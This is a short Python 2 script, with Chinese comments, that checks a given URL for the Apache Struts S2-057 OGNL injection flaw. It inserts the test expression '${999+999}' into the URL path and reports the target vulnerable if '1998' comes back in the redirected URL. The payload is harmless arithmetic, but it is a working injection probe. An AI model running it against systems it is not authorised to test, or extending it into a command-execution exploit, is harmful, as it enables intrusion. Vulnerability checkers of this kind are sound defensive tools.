#!/usr/bin/python
#-*- coding: UTF-8 -*-
#coding=utf-8
import os
import requests
import argparse

'''
S2-057检测
:param url 检测url
'''
def check_s2_057(url):
    split_list = url.split('/')
    if len(split_list) > 2 :
        split_list[-2]
        exp = '${999+999}'
        split_list.insert(-1,exp)
        get_url =  '/'.join(split_list)
        try:
            rs = requests.get(get_url)
            rs_url = rs.url
            rs_split_list = rs_url.split('/')
            if '1998' == rs_split_list[-2]:
                print u'漏洞存在'
            else:
                print u'漏洞不存在'
        except Exception as e:
            print u'请求异常'
    else:
        print u'请求url错误'

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='check S2-057')
    parser.add_argument("-u","--url",help="check url.")
    args = parser.parse_args()
    url = args.url
    if not url:
        print 'please enter url'
    else:
        check_s2_057(url)